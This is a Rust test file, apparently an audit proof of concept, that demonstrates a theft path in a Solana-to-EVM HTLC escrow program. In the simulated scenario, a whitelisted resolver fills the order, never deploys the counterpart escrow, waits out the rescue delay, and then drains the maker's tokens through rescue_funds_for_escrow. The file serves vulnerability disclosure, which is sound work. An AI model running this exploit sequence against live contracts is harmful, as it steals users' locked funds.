use common::constants::RESCUE_DELAY;
use common_tests::helpers::*;
use common_tests::src_program::{create_order, SrcProgram};
use common_tests::whitelist::prepare_resolvers_src;
use solana_program_test::tokio;
use solana_sdk::signature::Signer;
use test_context::{test_context, AsyncTestContext};

// ============================================================================
// SCENARIO: Realistic Risk-Free Theft on Solana -> EVM Flow
// Attacker (Whitelisted Resolver) fills order on Day 0, does NOT deploy EVM escrow,
// waits 8 days, then steals Maker's funds via rescue_funds_for_escrow.
// ============================================================================
#[test_context(TestStateBase<SrcProgram, TokenSPL>)]
#[tokio::test]
async fn test_attack_realistic_resolver_theft(src_state: &mut TestStateBase<SrcProgram, TokenSPL>) {
    println!("\n=========================================");
    println!("=== SCENARIO: Realistic Risk-Free Theft by Resolver ===");
    println!("=========================================");

    // Set up: Maker swaps 100 JUP (Solana) for USDT (EVM)
    src_state.test_arguments.asset_is_native = false;
    src_state.test_arguments.order_amount = 100_000_000; // 100 JUP
    src_state.test_arguments.escrow_amount = 100_000_000;

    let maker_initial_jup = get_token_balance(&mut src_state.context, &src_state.maker_wallet.token_account).await;
    let attacker_initial_jup = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;

    // =====================================================================
    // DAY 0 (Second 0): Maker creates order on Solana (Source Chain)
    // =====================================================================
    println!("\n=== DAY 0: Maker creates order on Solana (Source Chain) ===");
    let (_order, _order_ata) = create_order(src_state).await;
    println!("[DAY 0] Maker locked 100 JUP on Solana. Waiting for Resolver to fill.");

    // =====================================================================
    // DAY 0 (Second 1): Attacker (Resolver) IMMEDIATELY fills the order
    // =====================================================================
    println!("\n=== DAY 0 (Second 1): Attacker (Whitelisted Resolver) fills order ===");
    prepare_resolvers_src(src_state, &[src_state.taker_wallet.keypair.pubkey()]).await;
    println!("[DAY 0] Attacker is a registered Whitelisted Resolver.");

    // Attacker fills the order on Solana. 100 JUP moves from order_ata to escrow_ata.
    let (escrow, escrow_ata) = create_escrow(src_state).await;
    println!("[DAY 0] Attacker called create_escrow(). 100 JUP moved to escrow_ata.");
    println!("[DAY 0] Attacker DOES NOT deploy EVM escrow. Attacker DOES NOT reveal secret.");

    // =====================================================================
    // DAY 0 (Second 2) to DAY 7: Attacker stays silent. Maker is locked.
    // =====================================================================
    println!("\n=== DAY 1-7: Attacker silent. Maker is locked. ===");
    println!("[DAY 1-7] Maker cannot withdraw (no secret revealed).");
    println!("[DAY 1-7] Maker cannot cancel (SrcCancellation = 16 days, not started yet).");
    println!("[DAY 1-7] No other Resolver can intervene (order already filled).");

    // =====================================================================
    // DAY 8: Attacker exploits rescue_funds_for_escrow
    // =====================================================================
    println!("\n=== DAY 8: Attacker exploits rescue_funds_for_escrow ===");
    
    // Fast forward to Day 8 (RESCUE_DELAY = 691200 seconds = 8 days)
    set_time(&mut src_state.context, src_state.init_timestamp + RESCUE_DELAY + 100);

    let attacker_jup_before = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    
    // Attacker calls rescue_funds_for_escrow to steal 100 JUP WITHOUT secret
    src_state.test_arguments.rescue_amount = 100_000_000;
    let rescue_tx = SrcProgram::get_rescue_funds_tx(
        src_state,
        &escrow,
        &src_state.token,
        &escrow_ata,
        &src_state.taker_wallet.token_account, // Funds routed to Attacker (taker_ata)
    );
    src_state.client.process_transaction(rescue_tx).await.expect_success();

    let attacker_jup_after = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    let stolen_jup = attacker_jup_after - attacker_jup_before;

    println!("[DAY 8] Attacker stole {} JUP via rescue_funds_for_escrow WITHOUT SECRET!", stolen_jup);
    println!("[DAY 8] Escrow closed. Maker has no recourse.");

    // =====================================================================
    // IMPACT ANALYSIS
    // =====================================================================
    println!("\n=========================================");
    println!("=== FINAL IMPACT ANALYSIS ===");
    println!("=========================================");
    
    let maker_final_jup = get_token_balance(&mut src_state.context, &src_state.maker_wallet.token_account).await;
    let attacker_final_jup = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    
    println!("[Solana SRC] Maker initial JUP: {}", maker_initial_jup);
    println!("[Solana SRC] Maker final JUP:   {} (LOST 100 JUP)", maker_final_jup);
    println!("[Solana SRC] Attacker initial JUP: {}", attacker_initial_jup);
    println!("[Solana SRC] Attacker final JUP:   {} (GAINED 100 JUP)", attacker_final_jup);
    
    println!("\n[VERDICT] Attacker NEVER deployed EVM escrow.");
    println!("[VERDICT] Attacker NEVER revealed HTLC secret.");
    println!("[VERDICT] Attacker stole 100% of Maker's principal on Solana Source Chain.");
    println!("[VERDICT] This is a RISK-FREE THEFT.");
    println!("[VERDICT] HTLC atomicity is COMPLETELY BROKEN.");

    assert!(stolen_jup > 0, "Attacker should have stolen JUP");
    assert!(maker_final_jup < maker_initial_jup, "Maker should have lost JUP");
}
